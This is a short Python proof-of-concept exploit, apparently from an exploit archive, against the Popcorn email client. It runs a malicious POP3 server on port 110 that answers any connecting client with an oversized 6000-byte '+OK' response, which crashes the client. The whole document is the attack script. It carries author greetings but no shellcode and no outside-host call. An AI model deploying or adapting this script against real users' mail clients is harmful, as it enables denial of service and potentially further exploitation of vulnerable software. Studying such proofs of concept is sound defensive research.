#!/usr/bin/python
#[x]Product download : http://www.ultrafunk.com/products/popcorn/
#[+]Founder : x.CJP.x
#[+]Greeting : His0k4,Sub-Zero,Bibi-info,Aach2006,Youness,Simitch,Halimz,Bibicha.. :=)
#[-]Seni seviyorum, base64_decode('TW91bmE=');

from socket import *
import struct

buffer="\x41"*6000 # just random

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 110))
s.listen(1)
print "[*] Listening on [POP3] 110"
c, addr = s.accept()
print "[*] Connection accepted from: %s" % (addr[0])

c.send("+OK "+buffer+"\r\n")
c.recv(512)
raw_input("[*] Crashed!\nPress key to quit")
c.close()
s.close()